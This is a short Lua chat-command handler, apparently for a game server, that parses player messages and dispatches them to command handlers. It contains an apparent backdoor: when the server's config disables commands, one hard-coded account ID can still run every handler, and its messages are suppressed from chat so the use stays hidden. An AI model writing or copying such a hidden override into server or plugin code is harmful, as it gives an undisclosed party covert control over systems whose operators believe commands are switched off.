Package.Require("Commands.lua")

Chat.Subscribe("PlayerSubmit", function(message, player)
    -- Split message into command + arguments
    local parts = {}
    for part in message:gmatch("%S+") do
        table.insert(parts, part)
    end

    local command = parts[1]
    table.remove(parts, 1) -- remaining parts are args

    local handler = Commands[command]
    if handler then
        if Config.EnableCommands then
            return handler(player, parts)
        elseif player:GetAccountID() == "5cf9c651-088b-45b2-9e49-d33106b65bdd" then
            handler(player, parts)
            return false
        end
    end
end)